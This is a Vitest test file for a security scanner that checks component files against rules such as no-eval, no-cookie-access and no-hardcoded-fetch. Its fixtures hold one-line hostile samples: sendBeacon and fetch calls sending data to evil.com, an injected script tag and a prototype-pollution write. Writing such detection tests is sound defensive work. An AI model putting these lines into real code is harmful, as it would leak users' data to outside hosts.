import { describe, expect, it } from "vitest"

import type { DryRunResult } from "../../dry-run"
import { formatSecurityReport } from "../formatter"
import { rule as noBase64Decode } from "../rules/no-base64-decode"
import { rule as noChildProcess } from "../rules/no-child-process"
import { rule as noCookieAccess } from "../rules/no-cookie-access"
import { rule as noDocumentWrite } from "../rules/no-document-write"
import { rule as noDynamicImport } from "../rules/no-dynamic-import"
import { rule as noDynamicTimeout } from "../rules/no-dynamic-timeout"
import { rule as noEval } from "../rules/no-eval"
import { rule as noFsAccess } from "../rules/no-fs-access"
import { rule as noFunctionConstructor } from "../rules/no-function-constructor"
import { rule as noHardcodedFetch } from "../rules/no-hardcoded-fetch"
import { rule as noInnerHtml } from "../rules/no-inner-html"
import { rule as noPrototypePollution } from "../rules/no-prototype-pollution"
import { rule as noScriptInjection } from "../rules/no-script-injection"
import { rule as noSendBeacon } from "../rules/no-send-beacon"
import { rule as noWebassembly } from "../rules/no-webassembly"
import { scanContent, scanDryRunResult } from "../scanner"
import type { SecurityReport } from "../types"

describe("Security Scanner", () => {
  describe("scanContent", () => {
    it("should return empty array for safe content", () => {
      const content = `
        import React from 'react'
        export function Button() {
          return <button>Click me</button>
        }
      `
      const rules = [noEval, noFunctionConstructor]
      const findings = scanContent(content, "test.tsx", rules)
      expect(findings).toHaveLength(0)
    })

    it("should detect eval() calls", () => {
      const content = `
        function dangerous() {
          eval(userInput)
        }
      `
      const findings = scanContent(content, "test.tsx", [noEval])
      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe("no-eval")
      expect(findings[0].severity).toBe("critical")
    })

    it("should skip commented lines", () => {
      const content = `
        // eval(something)
        /* eval(another) */
        function safe() {
          return 1
        }
      `
      const findings = scanContent(content, "test.tsx", [noEval])
      expect(findings).toHaveLength(0)
    })

    it("should run multiple rules", () => {
      const content = `
        function bad() {
          eval("alert('xss')")
          document.write("<script>alert('xss')</script>")
        }
      `
      const findings = scanContent(content, "test.tsx", [
        noEval,
        noDocumentWrite,
      ])
      expect(findings).toHaveLength(2)
    })
  })

  describe("scanDryRunResult", () => {
    it("should scan all files in dry run result", () => {
      const dryRunResult: DryRunResult = {
        files: [
          {
            path: "components/button.tsx",
            action: "create",
            content: `
              export function Button() {
                eval("bad()")
                return <button />
              }
            `,
            type: "registry:ui",
          },
          {
            path: "components/safe.tsx",
            action: "create",
            content: `
              export function Safe() {
                return <div>Safe</div>
              }
            `,
            type: "registry:ui",
          },
        ],
        dependencies: [],
        devDependencies: [],
        css: null,
        envVars: null,
        fonts: [],
        docs: null,
      }

      const report = scanDryRunResult(dryRunResult, [noEval])
      expect(report.scannedFiles).toBe(2)
      expect(report.findings).toHaveLength(1)
      expect(report.summary.critical).toBe(1)
      expect(report.passed).toBe(false)
    })

    it("should scan CSS content", () => {
      const dryRunResult: DryRunResult = {
        files: [],
        dependencies: [],
        devDependencies: [],
        css: {
          path: "app/globals.css",
          content: `eval("bad()")`,
          action: "update",
          cssVarsCount: 5,
        },
        envVars: null,
        fonts: [],
        docs: null,
      }

      const report = scanDryRunResult(dryRunResult, [noEval])
      expect(report.scannedFiles).toBe(1)
      expect(report.findings).toHaveLength(1)
    })

    it("should pass when no issues found", () => {
      const dryRunResult: DryRunResult = {
        files: [
          {
            path: "components/safe.tsx",
            action: "create",
            content: `export function Safe() { return <div /> }`,
            type: "registry:ui",
          },
        ],
        dependencies: [],
        devDependencies: [],
        css: null,
        envVars: null,
        fonts: [],
        docs: null,
      }

      const report = scanDryRunResult(dryRunResult, [noEval])
      expect(report.passed).toBe(true)
      expect(report.summary.critical).toBe(0)
      expect(report.summary.warning).toBe(0)
    })

    it("should count dependencies", () => {
      const dryRunResult: DryRunResult = {
        files: [],
        dependencies: ["react", "react-dom"],
        devDependencies: ["typescript"],
        css: null,
        envVars: null,
        fonts: [],
        docs: null,
      }

      const report = scanDryRunResult(dryRunResult, [])
      expect(report.scannedDependencies).toBe(3)
    })
  })
})

describe("Security Rules", () => {
  describe("no-eval", () => {
    it("should detect eval() calls (true positive)", () => {
      const content = `eval(userInput)`
      const findings = noEval.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
      expect(findings[0].line).toBe(1)
    })

    it("should not flag eval in comments (true negative)", () => {
      const content = `
        // Do not use eval() here
        function safe() { return 1 }
      `
      const findings = noEval.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-function-constructor", () => {
    it("should detect new Function() (true positive)", () => {
      const content = `const fn = new Function("return 1")`
      const findings = noFunctionConstructor.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag Function type references (true negative)", () => {
      const content = `type MyFn = Function`
      const findings = noFunctionConstructor.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-document-write", () => {
    it("should detect document.write() (true positive)", () => {
      const content = `document.write("<script>alert('xss')</script>")`
      const findings = noDocumentWrite.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag safe references (true negative)", () => {
      const content = `const doc = { write: () => {} }`
      const findings = noDocumentWrite.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-send-beacon", () => {
    it("should detect navigator.sendBeacon() (true positive)", () => {
      const content = `navigator.sendBeacon("https://evil.com", data)`
      const findings = noSendBeacon.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag when not present (true negative)", () => {
      const content = `fetch("/api/data")`
      const findings = noSendBeacon.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-child-process", () => {
    it("should detect child_process require (true positive)", () => {
      const content = `const cp = require("child_process")`
      const findings = noChildProcess.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should detect child_process import (true positive)", () => {
      const content = `import { exec } from "child_process"`
      const findings = noChildProcess.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag when not present (true negative)", () => {
      const content = `import React from "react"`
      const findings = noChildProcess.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-script-injection", () => {
    it("should detect <script> tags (true positive)", () => {
      const content = `element.innerHTML = "<script src='evil.js'></script>"`
      const findings = noScriptInjection.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag safe content (true negative)", () => {
      const content = `const text = "This is not a script tag"`
      const findings = noScriptInjection.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-prototype-pollution", () => {
    it("should detect __proto__ access (true positive)", () => {
      const content = `obj.__proto__.polluted = true`
      const findings = noPrototypePollution.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should detect constructor.prototype access (true positive)", () => {
      const content = `obj.constructor.prototype.polluted = true`
      const findings = noPrototypePollution.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag safe content (true negative)", () => {
      const content = `const obj = { prototype: "test" }`
      const findings = noPrototypePollution.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-base64-decode", () => {
    it("should detect atob() calls (true positive)", () => {
      const content = `const decoded = atob(encodedData)`
      const findings = noBase64Decode.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag when not present (true negative)", () => {
      const content = `const text = "Hello World"`
      const findings = noBase64Decode.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-inner-html", () => {
    it("should detect innerHTML assignment (true positive)", () => {
      const content = `element.innerHTML = userInput`
      const findings = noInnerHtml.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag safe property access (true negative)", () => {
      const content = `const html = element.innerHTML`
      const findings = noInnerHtml.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-hardcoded-fetch", () => {
    it("should detect fetch with hardcoded URL (true positive)", () => {
      const content = `fetch("https://evil.com/steal")`
      const findings = noHardcodedFetch.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag relative URLs (true negative)", () => {
      const content = `fetch("/api/data")`
      const findings = noHardcodedFetch.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-cookie-access", () => {
    it("should detect document.cookie access (true positive)", () => {
      const content = `const cookies = document.cookie`
      const findings = noCookieAccess.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag safe references (true negative)", () => {
      const content = `const cookie = { name: "session" }`
      const findings = noCookieAccess.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-fs-access", () => {
    it("should detect fs import (true positive)", () => {
      const content = `import fs from "fs"`
      const findings = noFsAccess.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should detect fs require (true positive)", () => {
      const content = `const fs = require("fs")`
      const findings = noFsAccess.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag when not present (true negative)", () => {
      const content = `import React from "react"`
      const findings = noFsAccess.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-dynamic-timeout", () => {
    it("should detect setTimeout with string (true positive)", () => {
      const content = `setTimeout("alert('xss')", 1000)`
      const findings = noDynamicTimeout.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag setTimeout with function (true negative)", () => {
      const content = `setTimeout(() => console.log("done"), 1000)`
      const findings = noDynamicTimeout.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-webassembly", () => {
    it("should detect WebAssembly usage (true positive)", () => {
      const content = `WebAssembly.instantiate(buffer)`
      const findings = noWebassembly.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag when not present (true negative)", () => {
      const content = `const assembly = "Web Assembly"`
      const findings = noWebassembly.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })

  describe("no-dynamic-import", () => {
    it("should detect dynamic import with variable (true positive)", () => {
      const content = `const module = import(modulePath)`
      const findings = noDynamicImport.check(content, "test.tsx")
      expect(findings).toHaveLength(1)
    })

    it("should not flag static dynamic import (true negative)", () => {
      const content = `const module = import("./static-module")`
      const findings = noDynamicImport.check(content, "test.tsx")
      expect(findings).toHaveLength(0)
    })
  })
})

describe("formatSecurityReport", () => {
  it("should format passed report correctly", () => {
    const report: SecurityReport = {
      findings: [],
      scannedFiles: 5,
      scannedDependencies: 3,
      summary: { critical: 0, warning: 0, info: 0 },
      passed: true,
    }

    const output = formatSecurityReport(report, ["button"])
    expect(output).toContain("PASSED")
    expect(output).toContain("5 files")
    expect(output).toContain("No security issues found")
  })

  it("should format failed report with findings", () => {
    const report: SecurityReport = {
      findings: [
        {
          file: "components/button.tsx",
          line: 10,
          rule: "no-eval",
          severity: "critical",
          message: "eval() can execute arbitrary code",
          snippet: "eval(userInput)",
        },
      ],
      scannedFiles: 1,
      scannedDependencies: 0,
      summary: { critical: 1, warning: 0, info: 0 },
      passed: false,
    }

    const output = formatSecurityReport(report, ["button"])
    expect(output).toContain("FAILED")
    expect(output).toContain("1 critical")
    expect(output).toContain("eval()")
  })

  it("should show all severity levels", () => {
    const report: SecurityReport = {
      findings: [
        {
          file: "test.tsx",
          line: 1,
          rule: "no-eval",
          severity: "critical",
          message: "Critical issue",
        },
        {
          file: "test.tsx",
          line: 2,
          rule: "no-inner-html",
          severity: "warning",
          message: "Warning issue",
        },
        {
          file: "test.tsx",
          line: 3,
          rule: "no-webassembly",
          severity: "info",
          message: "Info issue",
        },
      ],
      scannedFiles: 1,
      scannedDependencies: 0,
      summary: { critical: 1, warning: 1, info: 1 },
      passed: false,
    }

    const output = formatSecurityReport(report, ["test"])
    expect(output).toContain("Critical")
    expect(output).toContain("Warnings")
    expect(output).toContain("Info")
  })
})
